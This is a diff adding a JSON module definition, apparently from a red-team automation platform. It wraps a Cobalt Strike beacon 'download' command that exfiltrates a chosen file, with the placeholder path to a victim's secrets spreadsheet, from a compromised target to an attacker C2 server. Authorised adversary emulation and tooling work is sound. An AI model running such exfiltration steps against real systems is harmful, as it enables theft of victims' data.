@@ -1,0 +1,65 @@
+{
+  "_payload_version": "2.0",
+  "_saved_at": "2026-01-21T17:51:10.705067",
+  "_artifact_key": "lib_cs_download",
+  "id": "lib_cs_download",
+  "name": "Download File from Target",
+  "category": "Cobalt Strike",
+  "tactic": "Collection",
+  "icon": "\u2b07\ufe0f",
+  "riskLevel": "medium",
+  "subcategory": "File Transfer",
+  "description": "Exfiltrate file from victim to attacker machine",
+  "estimatedDuration": 45,
+  "executionType": "cobalt_strike",
+  "cobaltStrikeCommand": "download ${remote_path}",
+  "robotKeyword": null,
+  "robotTemplate": null,
+  "shellCommand": null,
+  "inputs": [
+    {
+      "id": "beacon",
+      "label": "Target Beacon",
+      "type": "Agent_Session",
+      "required": true,
+      "description": "Active beacon session"
+    }
+  ],
+  "outputs": [
+    {
+      "id": "downloaded_file",
+      "label": "Exfiltrated File",
+      "type": "File_Data",
+      "description": "File retrieved from target"
+    }
+  ],
+  "parameters": [
+    {
+      "id": "remote_path",
+      "label": "Remote File Path",
+      "type": "string",
+      "required": true,
+      "placeholder": "C:\\Users\\victim\\Documents\\secrets.xlsx",
+      "default": null,
+      "description": "File path on target system"
+    }
+  ],
+  "requirements": {
+    "c2Server": true,
+    "listeners": [],
+    "payloads": [],
+    "sshConnections": [],
+    "externalTools": [],
+    "libraries": []
+  },
+  "metadata": {
+    "version": "1.0.0",
+    "tags": [
+      "c2",
+      "file-transfer",
+      "download",
+      "exfiltration",
+      "cobalt-strike"
+    ]
+  }
+}
